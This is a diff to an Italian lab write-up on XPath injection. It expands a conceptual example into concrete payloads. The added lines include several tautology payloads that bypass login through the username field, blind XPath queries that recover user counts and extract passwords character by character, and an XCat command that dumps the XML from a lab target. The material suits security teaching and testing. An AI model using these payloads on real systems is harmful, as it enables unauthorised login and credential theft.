@@ -47,26 +47,39 @@ segnale che l'input raggiunge l'espressione senza escape.
 
 ### Fase 2 - Bypass dell'autenticazione (concettuale)
 
-Come nella SQLi, si introduce una condizione sempre vera (tautologia) che rende irrilevante la password. In
-forma didattica minima:
+Come nella SQLi, si introduce una condizione sempre vera (tautologia) che rende irrilevante la password. Payload
+nel campo username:
 
 ```
-Nome utente: ' or '1'='1          <-- tautologia: la condizione diventa sempre vera
-# la query, non sanitizzata, restituisce il primo nodo utente -> autenticazione bypassata
+' or '1'='1              <-- tautologia classica
+admin' or '1'='1         <-- forza l'utente 'admin'
+') or ('1'='1            <-- quando l'input e racchiuso tra parentesi
+' or position()=1 or '   <-- seleziona il primo nodo utente
 ```
 
 ### Fase 3 - Estrazione blind dell'intero documento
 
-In assenza di controllo d'accesso, si naviga il documento XML un nodo/carattere alla volta usando funzioni XPath
-(`substring()`, `string-length()`, `name()`) e le differenze comportamentali tra condizioni vere e false.
-
-Output illustrativo (rappresentativo, esito di una condizione di test):
+In assenza di controllo d'accesso XPath, si naviga l'intero XML un carattere alla volta con `substring()`,
+`string-length()`, `count()`, `name()` e le differenze comportamentali vero/falso:
 
 ```
-string-length(//user[1]/password) > 8  -> TRUE   <-- la password del primo utente e lunga piu di 8 caratteri
+# Quanti nodi utente esistono
+' or count(/users/user)=5 or '                        -> TRUE se ci sono 5 utenti
+# Lunghezza della password del primo utente
+' or string-length(/users/user[1]/password)=12 or '   -> TRUE se lunga 12
+# Estrazione carattere per carattere
+' or substring(/users/user[1]/password,1,1)='P' or '   -> TRUE: 1o char = 'P'
+' or substring(/users/user[1]/password,2,1)='a' or '   -> TRUE: 2o char = 'a'
+# Scoperta della struttura (nome di nodi/attributi)
+' or name(/users/user[1]/*[1])='username' or '
 ```
 
-Strumenti come `XCat` automatizzano l'estrazione blind dell'intero XML.
+Automazione con `XCat` (dump completo del documento via blind XPath):
+
+```bash
+xcat --method GET run "http://target.lab/login" username --true-string "Welcome" \
+  -- "/users/user[position()=1]"
+```
 
 ## Analisi dei risultati
 
